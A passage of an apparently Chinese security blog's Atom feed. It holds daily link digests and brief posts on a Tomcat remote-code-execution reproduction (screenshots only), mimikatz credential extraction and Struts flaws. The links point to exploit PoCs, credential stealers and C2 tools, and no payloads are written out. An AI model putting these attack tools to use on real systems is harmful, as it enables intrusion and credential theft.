<li>dnscat2 - Create an Encrypted Command &amp; Control (C&amp;C) Channel over the DNS Protocol<br><a href="http://www.kitploit.com/2017/09/dnscat2-create-encrypted-command.html" target="_blank" rel="external">http://www.kitploit.com/2017/09/dnscat2-create-encrypted-command.html</a></li>
</ul>
]]></content>
    
    <summary type="html">
    
      &lt;h4 id=&quot;每日安全动态&quot;&gt;&lt;a href=&quot;#每日安全动态&quot; class=&quot;headerlink&quot; title=&quot;每日安全动态&quot;&gt;&lt;/a&gt;每日安全动态&lt;/h4&gt;&lt;ul&gt;
&lt;li&gt;Python 对象注入漏洞利用&lt;br&gt;&lt;a href=&quot;http://defencely.com
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>Tomcat 远程代码执行漏洞(CVE-2017-12615)以及信息泄露漏洞(CVE-2017-12616)</title>
    <link href="http://kevien.github.io/2017/09/21/Tomcat-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-CVE-2017-12615-%E4%BB%A5%E5%8F%8A%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E-CVE-2017-12616/"/>
    <id>http://kevien.github.io/2017/09/21/Tomcat-远程代码执行漏洞-CVE-2017-12615-以及信息泄露漏洞-CVE-2017-12616/</id>
    <published>2017-09-21T07:20:42.000Z</published>
    <updated>2017-09-24T16:26:35.000Z</updated>
    
    <content type="html"><![CDATA[<h4 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h4><h4 id="复现"><a href="#复现" class="headerlink" title="复现"></a>复现</h4><ul>
<li>测试环境<br><img src="/2017/09/21/Tomcat-远程代码执行漏洞-CVE-2017-12615-以及信息泄露漏洞-CVE-2017-12616/tomcatversion.png" alt=""></li>
<li>首先修改conf/web.xml文件，如下<br><img src="/2017/09/21/Tomcat-远程代码执行漏洞-CVE-2017-12615-以及信息泄露漏洞-CVE-2017-12616/config.png" alt=""><br><br>修改完成之后重启tomcat服务器</li>
<li>put上传文件<br><img src="/2017/09/21/Tomcat-远程代码执行漏洞-CVE-2017-12615-以及信息泄露漏洞-CVE-2017-12616/put.png" alt=""></li>
<li>测试<br><img src="/2017/09/21/Tomcat-远程代码执行漏洞-CVE-2017-12615-以及信息泄露漏洞-CVE-2017-12616/result.png" alt=""><h4 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h4></li>
<li>待更<h4 id="CVE-2017-12616-​信息泄露漏洞"><a href="#CVE-2017-12616-​信息泄露漏洞" class="headerlink" title="CVE-2017-12616 ​信息泄露漏洞"></a>CVE-2017-12616 ​信息泄露漏洞</h4><h4 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h4></li>
<li>说实话，没事儿去修改readonly为false的应该不多，所以漏洞影响有限。<h4 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h4></li>
<li><a href="https://mp.weixin.qq.com/s?__biz=MzI1NDg4MTIxMw==&amp;mid=2247483659&amp;idx=1&amp;sn=c23b3a3b3b43d70999bdbe644e79f7e5&amp;chksm=ea3f3dd9dd48b4cf1db66e70662126cf1eb45f60eb8205b3391d20f66564e6a789b158c0efe5&amp;mpshare=1&amp;scene=23&amp;srcid=0921nOtxiMml2bGoVXM9jKMS#rd" target="_blank" rel="external">https://mp.weixin.qq.com/s?__biz=MzI1NDg4MTIxMw==&amp;mid=2247483659&amp;idx=1&amp;sn=c23b3a3b3b43d70999bdbe644e79f7e5&amp;chksm=ea3f3dd9dd48b4cf1db66e70662126cf1eb45f60eb8205b3391d20f66564e6a789b158c0efe5&amp;mpshare=1&amp;scene=23&amp;srcid=0921nOtxiMml2bGoVXM9jKMS#rd</a></li>
<li><a href="http://www.freebuf.com/vuls/148283.html" target="_blank" rel="external">http://www.freebuf.com/vuls/148283.html</a></li>
<li><a href="https://mp.weixin.qq.com/s?__biz=MzI5Nzc0OTkxOQ==&amp;mid=2247483712&amp;idx=1&amp;sn=c92d1abc41c6a8293c83ff4913b214a4&amp;chksm=ecb11db0dbc694a62d5d073054d0bf41b2ab5680807f19a3357a82fcb4ba72883cf97e9b4321&amp;mpshare=1&amp;scene=23&amp;srcid=0921koVmEUnPZyCRatqKTka3#rd" target="_blank" rel="external">https://mp.weixin.qq.com/s?__biz=MzI5Nzc0OTkxOQ==&amp;mid=2247483712&amp;idx=1&amp;sn=c92d1abc41c6a8293c83ff4913b214a4&amp;chksm=ecb11db0dbc694a62d5d073054d0bf41b2ab5680807f19a3357a82fcb4ba72883cf97e9b4321&amp;mpshare=1&amp;scene=23&amp;srcid=0921koVmEUnPZyCRatqKTka3#rd</a></li>
</ul>
]]></content>
    
    <summary type="html">
    
      &lt;h4 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h4&gt;&lt;h4 id=&quot;复现&quot;&gt;&lt;a href=&quot;#复现&quot; class=&quot;headerlink&quot; title=&quot;复现&quot;&gt;&lt;/a&gt;复现&lt;/h4&gt;&lt;ul&gt;
&lt;
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>20170921安全动态</title>
    <link href="http://kevien.github.io/2017/09/21/20170921%E5%AE%89%E5%85%A8%E5%8A%A8%E6%80%81/"/>
    <id>http://kevien.github.io/2017/09/21/20170921安全动态/</id>
    <published>2017-09-21T02:32:52.000Z</published>
    <updated>2017-09-21T10:26:24.000Z</updated>
    
    <content type="html"><![CDATA[<h4 id="每日安全动态"><a href="#每日安全动态" class="headerlink" title="每日安全动态"></a>每日安全动态</h4><ul>
<li>针对 NFS 的渗透测试<br><a href="https://pentestacademy.wordpress.com/2017/09/20/nfs/" target="_blank" rel="external">https://pentestacademy.wordpress.com/2017/09/20/nfs/</a></li>
<li>Joomla! &lt;= 3.7.5 LDAP 注入漏洞详情（CVE-2017-14596）<br><a href="https://blog.ripstech.com/2017/joomla-takeover-in-20-seconds-with-ldap-injection-cve-2017-14596/" target="_blank" rel="external">https://blog.ripstech.com/2017/joomla-takeover-in-20-seconds-with-ldap-injection-cve-2017-14596/</a></li>
<li>retire.js - 一款用于检测 JavaScript 库是否存在已知漏洞的工具<br><a href="https://github.com/RetireJS/retire.js" target="_blank" rel="external">https://github.com/RetireJS/retire.js</a></li>
<li><p>racer - 一键式应用，可用于测试条件竞争<br><a href="https://github.com/sakurity/racer" target="_blank" rel="external">https://github.com/sakurity/racer</a><br><a href="https://github.com/insp3ctre/race-the-web" target="_blank" rel="external">https://github.com/insp3ctre/race-the-web</a><br><a href="http://racetheweb.io/bank" target="_blank" rel="external">http://racetheweb.io/bank</a></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">这个不错值得研究一下。</div></pre></td></tr></table></figure>
</li>
<li><p>滥用 DLL 延迟加载实现远程代码注入<br><a href="http://hatriot.github.io/blog/2017/09/19/abusing-delay-load-dll/" target="_blank" rel="external">http://hatriot.github.io/blog/2017/09/19/abusing-delay-load-dll/</a></p>
</li>
<li>Tomcat 远程代码执行漏洞分析（CVE-2017-12615）及补丁 Bypass，来自腾讯云鼎实验室的分析<br><a href="http://www.freebuf.com/vuls/148283.html" target="_blank" rel="external">http://www.freebuf.com/vuls/148283.html</a></li>
<li>蓝牙协议 Android 信息泄露漏洞 (CVE-2017-0785/Blueborne) 的 PoC<br><a href="https://github.com/ojasookert/CVE-2017-0785" target="_blank" rel="external">https://github.com/ojasookert/CVE-2017-0785</a></li>
<li>CVE-2016-10191 FFmpeg RTMP Heap Buffer Overflow 漏洞分析及利用，来自 蚂蚁金服巴斯光年安全实验室<br><a href="http://jaq.alibaba.com/community/art/show?articleid=1074" target="_blank" rel="external">http://jaq.alibaba.com/community/art/show?articleid=1074</a></li>
<li>Burp Suite被曝存在远程代码执行漏洞<br><a href="http://bobao.360.cn/news/detail/4334.html" target="_blank" rel="external">http://bobao.360.cn/news/detail/4334.html</a></li>
<li>Windows内核池喷射的乐趣<br><a href="http://bobao.360.cn/learning/detail/4439.html" target="_blank" rel="external">http://bobao.360.cn/learning/detail/4439.html</a></li>
<li>java反序列化的漏洞<br><a href="https://diablohorn.com/2017/09/09/understanding-practicing-java-deserialization-exploits/" target="_blank" rel="external">https://diablohorn.com/2017/09/09/understanding-practicing-java-deserialization-exploits/</a></li>
<li>DenyAll WAF远程代码执行漏洞<br><a href="https://pentest.blog/advisory-denyall-web-application-firewall-unauthenticated-remote-code-execution/" target="_blank" rel="external">https://pentest.blog/advisory-denyall-web-application-firewall-unauthenticated-remote-code-execution/</a></li>
<li>打破Windows环境的限制<br><a href="https://weirdgirlweb.wordpress.com/" target="_blank" rel="external">https://weirdgirlweb.wordpress.com/</a></li>
<li>应急响应案例分析与经验分享<br><a href="http://blog.nsfocus.net/emergency-response-case-study/" target="_blank" rel="external">http://blog.nsfocus.net/emergency-response-case-study/</a><h4 id="其它"><a href="#其它" class="headerlink" title="其它"></a>其它</h4></li>
<li>vscode的evernote插件<br><a href="https://github.com/michalyao/evermonkey" target="_blank" rel="external">https://github.com/michalyao/evermonkey</a><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">现在的evernote的开发者token暂时不能用了:(</div></pre></td></tr></table></figure>
</li>
</ul>
]]></content>
    
    <summary type="html">
    
      &lt;h4 id=&quot;每日安全动态&quot;&gt;&lt;a href=&quot;#每日安全动态&quot; class=&quot;headerlink&quot; title=&quot;每日安全动态&quot;&gt;&lt;/a&gt;每日安全动态&lt;/h4&gt;&lt;ul&gt;
&lt;li&gt;针对 NFS 的渗透测试&lt;br&gt;&lt;a href=&quot;https://pentestacademy.
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>windows认证机制以及常见密码获取工具分析</title>
    <link href="http://kevien.github.io/2017/09/20/windows%E8%AE%A4%E8%AF%81%E6%9C%BA%E5%88%B6%E4%BB%A5%E5%8F%8A%E5%B8%B8%E8%A7%81%E5%AF%86%E7%A0%81%E8%8E%B7%E5%8F%96%E5%B7%A5%E5%85%B7%E5%88%86%E6%9E%90/"/>
    <id>http://kevien.github.io/2017/09/20/windows认证机制以及常见密码获取工具分析/</id>
    <published>2017-09-20T07:22:16.000Z</published>
    <updated>2017-09-29T14:05:35.000Z</updated>
    
    <content type="html"><![CDATA[<h4 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h4><ul>
<li>先来了解一下lsass进程。<br>Local Security Authority Subsystem Service (LSASS) is a process in Microsoft Windows operating systems that is responsible for enforcing the security policy on the system. It verifies users logging on to a Windows computer or server, handles password changes, and creates access tokens.<a href="https://www.wikiwand.com/en/Local_Security_Authority_Subsystem_Service" target="_blank" rel="external">link</a></li>
<li>NTLM</li>
<li>Kerberos<h4 id="mimikatz"><a href="#mimikatz" class="headerlink" title="mimikatz"></a>mimikatz</h4></li>
<li>内存导出<br><img src="/2017/09/20/windows认证机制以及常见密码获取工具分析/procdump.png" alt=""></li>
<li>从本地获取密码<br><img src="/2017/09/20/windows认证机制以及常见密码获取工具分析/mimikatzdmp.png" alt=""><h4 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h4></li>
<li><a href="https://msdn.microsoft.com/en-us/library/windows/desktop/ee663293(v=vs.85).aspx" target="_blank" rel="external">https://msdn.microsoft.com/en-us/library/windows/desktop/ee663293(v=vs.85).aspx</a></li>
<li><a href="https://msdn.microsoft.com/en-us/library/windows/desktop/aa378749(v=vs.85).aspx" target="_blank" rel="external">https://msdn.microsoft.com/en-us/library/windows/desktop/aa378749(v=vs.85).aspx</a></li>
<li><a href="https://msdn.microsoft.com/en-us/library/windows/desktop/aa378747(v=vs.85).aspx" target="_blank" rel="external">https://msdn.microsoft.com/en-us/library/windows/desktop/aa378747(v=vs.85).aspx</a></li>
<li><a href="http://blog.csdn.net/qq_26886929/article/details/53905654" target="_blank" rel="external">http://blog.csdn.net/qq_26886929/article/details/53905654</a></li>
<li><a href="http://blog.csdn.net/wulantian/article/details/42418231" target="_blank" rel="external">http://blog.csdn.net/wulantian/article/details/42418231</a></li>
<li><a href="https://github.com/gentilkiwi/mimikatz/wiki" target="_blank" rel="external">https://github.com/gentilkiwi/mimikatz/wiki</a></li>
</ul>
]]></content>
    
    <summary type="html">
    
      &lt;h4 id=&quot;概述&quot;&gt;&lt;a href=&quot;#概述&quot; class=&quot;headerlink&quot; title=&quot;概述&quot;&gt;&lt;/a&gt;概述&lt;/h4&gt;&lt;ul&gt;
&lt;li&gt;先来了解一下lsass进程。&lt;br&gt;Local Security Authority Subsystem Service (LS
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>20170920安全动态</title>
    <link href="http://kevien.github.io/2017/09/20/20170920%E5%AE%89%E5%85%A8%E5%8A%A8%E6%80%81/"/>
    <id>http://kevien.github.io/2017/09/20/20170920安全动态/</id>
    <published>2017-09-20T02:43:00.000Z</published>
    <updated>2017-09-24T16:30:27.000Z</updated>
    
    <content type="html"><![CDATA[<h4 id="每日安全动态"><a href="#每日安全动态" class="headerlink" title="每日安全动态"></a>每日安全动态</h4><ul>
<li>我如何使用Cloud Fuzzing挖到了一个Tcpdump漏洞<br><a href="http://www.freebuf.com/articles/network/147955.html" target="_blank" rel="external">http://www.freebuf.com/articles/network/147955.html</a></li>
<li>Introducing pywintrace: A Python Wrapper for ETW<br><a href="https://www.fireeye.com/blog/threat-research/2017/09/pywintrace-python-wrapper-for-etw.html" target="_blank" rel="external">https://www.fireeye.com/blog/threat-research/2017/09/pywintrace-python-wrapper-for-etw.html</a></li>
<li>如何搭建一个便携式蜂窝网络<br><https: mbro95.github.io="" portablecellnetwork=""></https:></li>
<li>如何设计一个系统，能够抵抗住 Apache Struts S2-045（CVE-2017-5638）漏洞攻击<br><https: 18="" 2017="" alexgaynor.net="" sep="" surviving-struts-cve=""></https:></li>
<li>如何搭建一个分布式 Web 爬虫系统<br><a href="https://benbernardblog.com/the-tale-of-creating-a-distributed-web-crawler/" target="_blank" rel="external">https://benbernardblog.com/the-tale-of-creating-a-distributed-web-crawler/</a></li>
<li>smbmap：用于SMB枚举的工具<br><a href="https://github.com/ShawnDEvans/smbmap" target="_blank" rel="external">https://github.com/ShawnDEvans/smbmap</a></li>
<li>Detecting debuggers by abusing a bad assumption within Windows<br><a href="http://www.triplefault.io/2017/08/detecting-debuggers-by-abusing-bad.html" target="_blank" rel="external">http://www.triplefault.io/2017/08/detecting-debuggers-by-abusing-bad.html</a></li>
<li>5 tips for enterprises to ensure their SMB partners don’t cause a data breach<br><a href="http://www.techrepublic.com/article/5-tips-for-enterprises-to-ensure-their-smb-partners-dont-cause-a-data-breach/" target="_blank" rel="external">http://www.techrepublic.com/article/5-tips-for-enterprises-to-ensure-their-smb-partners-dont-cause-a-data-breach/</a></li>
</ul>
]]></content>
    
    <summary type="html">
    
      &lt;h4 id=&quot;每日安全动态&quot;&gt;&lt;a href=&quot;#每日安全动态&quot; class=&quot;headerlink&quot; title=&quot;每日安全动态&quot;&gt;&lt;/a&gt;每日安全动态&lt;/h4&gt;&lt;ul&gt;
&lt;li&gt;我如何使用Cloud Fuzzing挖到了一个Tcpdump漏洞&lt;br&gt;&lt;a href=&quot;htt
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>20170919安全动态</title>
    <link href="http://kevien.github.io/2017/09/19/20170919%E5%AE%89%E5%85%A8%E5%8A%A8%E6%80%81/"/>
    <id>http://kevien.github.io/2017/09/19/20170919安全动态/</id>
    <published>2017-09-19T02:33:04.000Z</published>
    <updated>2017-09-24T16:30:32.000Z</updated>
    
    <content type="html"><![CDATA[<h4 id="每日安全动态"><a href="#每日安全动态" class="headerlink" title="每日安全动态"></a>每日安全动态</h4><ul>
<li>《 The Python Bites your Apple：Fuzzing and exploiting OSX Kernel bugs》，《蛇噬汝果：基于Python的OSX内核漏洞模糊测试挖掘和利用》，来自科恩实验室 Flanker 在 XKungfoo 2016 会议的演讲<br><a href="https://papers.put.as/papers/macosx/2016/xkungfoo.pdf" target="_blank" rel="external">https://papers.put.as/papers/macosx/2016/xkungfoo.pdf</a></li>
<li>恶意 Chrome 插件分析<br><a href="https://blog.0day.rocks/malicious-chrome-extension-meddling-with-your-searches-581aa56ddc9c" target="_blank" rel="external">https://blog.0day.rocks/malicious-chrome-extension-meddling-with-your-searches-581aa56ddc9c</a></li>
<li>探测 mimikatz 以及其他可疑的 lsass 访问 - Part 1<br><a href="https://www.eideon.com/2017-09-09-THL01-Mimikatz/" target="_blank" rel="external">https://www.eideon.com/2017-09-09-THL01-Mimikatz/</a></li>
<li>RDP劫持 - 如何透明地劫持 RDS 和 RemoteApp 会话<br><a href="&#109;&#97;&#x69;&#108;&#x74;&#x6f;&#58;&#104;&#116;&#116;&#x70;&#115;&#58;&#47;&#47;&#x6d;&#x65;&#100;&#x69;&#117;&#109;&#46;&#x63;&#111;&#x6d;&#x2f;&#x40;&#x6e;&#101;&#x74;&#x77;&#x6f;&#x72;&#x6b;&#x73;&#101;&#99;&#x75;&#x72;&#x69;&#116;&#121;&#x2f;&#114;&#x64;&#112;&#x2d;&#x68;&#105;&#x6a;&#97;&#x63;&#x6b;&#105;&#110;&#x67;&#45;&#x68;&#111;&#119;&#x2d;&#x74;&#x6f;&#45;&#104;&#105;&#106;&#97;&#x63;&#107;&#45;&#114;&#100;&#x73;&#45;&#97;&#x6e;&#100;&#x2d;&#114;&#x65;&#x6d;&#x6f;&#x74;&#101;&#97;&#x70;&#x70;&#45;&#115;&#101;&#x73;&#115;&#105;&#111;&#x6e;&#x73;&#x2d;&#x74;&#114;&#97;&#x6e;&#x73;&#112;&#97;&#x72;&#101;&#x6e;&#x74;&#108;&#121;&#45;&#x74;&#111;&#45;&#x6d;&#x6f;&#118;&#101;&#x2d;&#116;&#x68;&#x72;&#x6f;&#117;&#x67;&#x68;&#45;&#97;&#110;&#45;&#100;&#97;&#50;&#x61;&#x31;&#x65;&#x37;&#51;&#x61;&#x35;&#x66;&#54;&#63;&#x73;&#111;&#x75;&#x72;&#x63;&#101;&#61;&#x6c;&#x69;&#x6e;&#x6b;&#83;&#104;&#x61;&#x72;&#x65;&#x2d;&#x37;&#x64;&#x62;&#x36;&#x64;&#x32;&#100;&#102;&#52;&#50;&#97;&#x36;&#45;&#x31;&#x35;&#48;&#53;&#54;&#56;&#x36;&#x31;&#53;&#50;">&#104;&#116;&#116;&#x70;&#115;&#58;&#47;&#47;&#x6d;&#x65;&#100;&#x69;&#117;&#109;&#46;&#x63;&#111;&#x6d;&#x2f;&#x40;&#x6e;&#101;&#x74;&#x77;&#x6f;&#x72;&#x6b;&#x73;&#101;&#99;&#x75;&#x72;&#x69;&#116;&#121;&#x2f;&#114;&#x64;&#112;&#x2d;&#x68;&#105;&#x6a;&#97;&#x63;&#x6b;&#105;&#110;&#x67;&#45;&#x68;&#111;&#119;&#x2d;&#x74;&#x6f;&#45;&#104;&#105;&#106;&#97;&#x63;&#107;&#45;&#114;&#100;&#x73;&#45;&#97;&#x6e;&#100;&#x2d;&#114;&#x65;&#x6d;&#x6f;&#x74;&#101;&#97;&#x70;&#x70;&#45;&#115;&#101;&#x73;&#115;&#105;&#111;&#x6e;&#x73;&#x2d;&#x74;&#114;&#97;&#x6e;&#x73;&#112;&#97;&#x72;&#101;&#x6e;&#x74;&#108;&#121;&#45;&#x74;&#111;&#45;&#x6d;&#x6f;&#118;&#101;&#x2d;&#116;&#x68;&#x72;&#x6f;&#117;&#x67;&#x68;&#45;&#97;&#110;&#45;&#100;&#97;&#50;&#x61;&#x31;&#x65;&#x37;&#51;&#x61;&#x35;&#x66;&#54;&#63;&#x73;&#111;&#x75;&#x72;&#x63;&#101;&#61;&#x6c;&#x69;&#x6e;&#x6b;&#83;&#104;&#x61;&#x72;&#x65;&#x2d;&#x37;&#x64;&#x62;&#x36;&#x64;&#x32;&#100;&#102;&#52;&#50;&#97;&#x36;&#45;&#x31;&#x35;&#48;&#53;&#54;&#56;&#x36;&#x31;&#53;&#50;</a></li>
<li>Microsoft Office 有哪些特性可以被后门用来实现常驻（Persist），来自 MWR Labs<br><a href="https://labs.mwrinfosecurity.com/assets/BlogFiles/WilliamKnowles-MWR-44con-PersistingWithMicrosoftOffice.pdf" target="_blank" rel="external">https://labs.mwrinfosecurity.com/assets/BlogFiles/WilliamKnowles-MWR-44con-PersistingWithMicrosoftOffice.pdf</a></li>
<li>JSLinux - 在浏览器里运行 Linux 系统<br><a href="https://bellard.org/jslinux/" target="_blank" rel="external">https://bellard.org/jslinux/</a></li>
<li>idahunt  - NCCGroup 开源的用于辅助 IDA Pro 逆向分析的工具，譬如批量分析二进制文件<br><a href="https://github.com/nccgroup/idahunt" target="_blank" rel="external">https://github.com/nccgroup/idahunt</a></li>
<li>Active Directory ACL 的攻与防<br><a href="https://blogs.technet.microsoft.com/enterprisemobility/2017/09/18/active-directory-access-control-list-attacks-and-defense/" target="_blank" rel="external">https://blogs.technet.microsoft.com/enterprisemobility/2017/09/18/active-directory-access-control-list-attacks-and-defense/</a></li>
<li>Windows 系统中进程、线程的枚举以及 Image 加载通知的回调<br><a href="http://www.triplefault.io/2017/09/enumerating-process-thread-and-image.html" target="_blank" rel="external">http://www.triplefault.io/2017/09/enumerating-process-thread-and-image.html</a></li>
<li>Empire中的Invoke-WScriptBypassUAC利用分析<br><a href="https://3gstudent.github.io/3gstudent.github.io/Empire%E4%B8%AD%E7%9A%84Invoke-WScriptBypassUAC%E5%88%A9%E7%94%A8%E5%88%86%E6%9E%90/" target="_blank" rel="external">https://3gstudent.github.io/3gstudent.github.io/Empire%E4%B8%AD%E7%9A%84Invoke-WScriptBypassUAC%E5%88%A9%E7%94%A8%E5%88%86%E6%9E%90/</a></li>
<li>OAuth 2.0 标准实现中的常见漏洞<br><a href="https://blog.avuln.com/article/4" target="_blank" rel="external">https://blog.avuln.com/article/4</a></li>
<li>Linux攻击面分析<br><https: anvilventures.com="" blog="" linux-attack-surface-analysis.html=""></https:></li>
</ul>
]]></content>
    
    <summary type="html">
    
      &lt;h4 id=&quot;每日安全动态&quot;&gt;&lt;a href=&quot;#每日安全动态&quot; class=&quot;headerlink&quot; title=&quot;每日安全动态&quot;&gt;&lt;/a&gt;每日安全动态&lt;/h4&gt;&lt;ul&gt;
&lt;li&gt;《 The Python Bites your Apple：Fuzzing and exploi
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>20170918安全动态</title>
    <link href="http://kevien.github.io/2017/09/18/20170918%E5%AE%89%E5%85%A8%E5%8A%A8%E6%80%81/"/>
    <id>http://kevien.github.io/2017/09/18/20170918安全动态/</id>
    <published>2017-09-18T05:27:10.000Z</published>
    <updated>2017-09-18T10:41:21.000Z</updated>
    
    <content type="html"><![CDATA[<h4 id="每日安全动态"><a href="#每日安全动态" class="headerlink" title="每日安全动态"></a>每日安全动态</h4><ul>
<li>游戏辅助背后的黑产流水线：年劫持攻击千万次牟利数百万<br><a href="http://www.freebuf.com/articles/network/147652.html" target="_blank" rel="external">http://www.freebuf.com/articles/network/147652.html</a></li>
<li>理解 V8 字节码<br><a href="https://medium.com/dailyjs/understanding-v8s-bytecode-317d46c94775" target="_blank" rel="external">https://medium.com/dailyjs/understanding-v8s-bytecode-317d46c94775</a></li>
<li>v8 引擎实现了 Type profiling，可在运行时收集类型信息<br><a href="https://medium.com/fhinkel/runtime-type-information-for-javascript-b134faac3c0a" target="_blank" rel="external">https://medium.com/fhinkel/runtime-type-information-for-javascript-b134faac3c0a</a></li>
<li>反取证技术 - 将进程隐藏在内核模式中<br><a href="https://www.cert-devoteam.fr/publications/en/antiforensics-techniques-process-hiding-in-kernel-mode/" target="_blank" rel="external">https://www.cert-devoteam.fr/publications/en/antiforensics-techniques-process-hiding-in-kernel-mode/</a></li>
<li>在 PyPI(Python包索引) 上发现十个恶意的库<br><a href="https://www.bleepingcomputer.com/news/security/ten-malicious-libraries-found-on-pypi-python-package-index/?utm_campaign=crowdfire&amp;utm_content=crowdfire&amp;utm_medium=social&amp;utm_source=twitter#238993254-tw#1505552853415" target="_blank" rel="external">https://www.bleepingcomputer.com/news/security/ten-malicious-libraries-found-on-pypi-python-package-index/?utm_campaign=crowdfire&amp;utm_content=crowdfire&amp;utm_medium=social&amp;utm_source=twitter#238993254-tw#1505552853415</a></li>
<li>macphish - 生成 Office for Mac 宏 Payload 的工具<br><a href="https://github.com/cldrn/macphish" target="_blank" rel="external">https://github.com/cldrn/macphish</a></li>
<li>Windows kernel pool spraying fun<br>Part 3 : <a href="https://theevilbit.blogspot.in/2017/09/windows-kernel-pool-spraying-fun-part-3.html" target="_blank" rel="external">https://theevilbit.blogspot.in/2017/09/windows-kernel-pool-spraying-fun-part-3.html</a>  </li>
</ul>
<p>Part 2：<a href="https://theevilbit.blogspot.in/2017/09/windows-kernel-pool-spraying-fun-part-2.html" target="_blank" rel="external">https://theevilbit.blogspot.in/2017/09/windows-kernel-pool-spraying-fun-part-2.html</a>  </p>
<p>Part  1： <a href="https://theevilbit.blogspot.in/2017/09/pool-spraying-fun-part-1.html" target="_blank" rel="external">https://theevilbit.blogspot.in/2017/09/pool-spraying-fun-part-1.html</a></p>
<ul>
<li>一次服务器被攻击的应急行动<br><a href="http://www.4hou.com/technology/7653.html" target="_blank" rel="external">http://www.4hou.com/technology/7653.html</a></li>
<li>Xdebug: A Tiny Attack Surface<br><a href="https://ricterz.me/posts/Xdebug%3A%20A%20Tiny%20Attack%20Surface" target="_blank" rel="external">https://ricterz.me/posts/Xdebug%3A%20A%20Tiny%20Attack%20Surface</a></li>
<li>利用 WinAFL 来 fuzz MSXML library<br><a href="https://symeonp.github.io/2017/09/17/fuzzing-winafl.html" target="_blank" rel="external">https://symeonp.github.io/2017/09/17/fuzzing-winafl.html</a></li>
<li>An Introduction to Printer Exploitation #1<br><a href="https://0x00sec.org/t/an-introduction-to-printer-exploitation-1/3565" target="_blank" rel="external">https://0x00sec.org/t/an-introduction-to-printer-exploitation-1/3565</a></li>
<li>除了拖拽（Drag’n’Drop），VMware 还有哪些攻击面？Comsecuris 去年为了准备 Pwn2Own 开始挖掘 VMware 的漏洞，可惜最后由于时间原因没能赶上。这篇 Blog 来自他们对 Vmware 攻击界面的剖析以及他们发现的漏洞<br><a href="https://comsecuris.com/blog/posts/vmware_vgpu_shader_vulnerabilities/" target="_blank" rel="external">https://comsecuris.com/blog/posts/vmware_vgpu_shader_vulnerabilities/</a></li>
<li>pyDHE：一个完整的Python Diffie-Hellman库<br><a href="https://github.com/deadPix3l/pyDHE" target="_blank" rel="external">https://github.com/deadPix3l/pyDHE</a></li>
<li>在Windows中枚举进程，线程和映像加载通知回调例程<br><a href="http://www.triplefault.io/2017/09/enumerating-process-thread-and-image.html" target="_blank" rel="external">http://www.triplefault.io/2017/09/enumerating-process-thread-and-image.html</a></li>
<li>针对Flash应用程序的渗透测试<br><a href="https://privsec.blog/penetration-testing-flash-apps-aka-how-to-cheat-at-blackjack/" target="_blank" rel="external">https://privsec.blog/penetration-testing-flash-apps-aka-how-to-cheat-at-blackjack/</a></li>
<li>githubscan：GitHub敏感信息扫描工具<br><a href="https://github.com/lianfeng30/githubscan" target="_blank" rel="external">https://github.com/lianfeng30/githubscan</a></li>
<li>挖漏洞的高级方法<br><a href="http://jackson.thuraisamy.me/finding-vulnerabilities.html" target="_blank" rel="external">http://jackson.thuraisamy.me/finding-vulnerabilities.html</a></li>
<li><p>LaZagne：浏览器密码凭证获取<br><a href="https://github.com/AlessandroZ/LaZagne" target="_blank" rel="external">https://github.com/AlessandroZ/LaZagne</a></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">很早就关注的一个项目了，还一直在更新。</div></pre></td></tr></table></figure>
</li>
<li><p>CVE-2016-0040：Privilege Escalation Exploit For WMI Receive Notification Vulnerability (x86-64)<br><https: github.com="" de7ec7ed="" cve-2016-0040=""></https:></p>
</li>
</ul>
]]></content>
    
    <summary type="html">
    
      &lt;h4 id=&quot;每日安全动态&quot;&gt;&lt;a href=&quot;#每日安全动态&quot; class=&quot;headerlink&quot; title=&quot;每日安全动态&quot;&gt;&lt;/a&gt;每日安全动态&lt;/h4&gt;&lt;ul&gt;
&lt;li&gt;游戏辅助背后的黑产流水线：年劫持攻击千万次牟利数百万&lt;br&gt;&lt;a href=&quot;http://ww
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>struts-052和struts-053分析</title>
    <link href="http://kevien.github.io/2017/09/17/struts-052%E5%92%8Cstruts-053%E5%88%86%E6%9E%90/"/>
    <id>http://kevien.github.io/2017/09/17/struts-052和struts-053分析/</id>
    <published>2017-09-17T09:07:22.000Z</published>
    <updated>2017-09-27T03:25:14.000Z</updated>
    
    <content type="html"><![CDATA[<h4 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h4><p>漏洞爆发的那几天有事(主要还是懒)没有及时的跟进漏洞，这两天跟一下漏洞。</p>
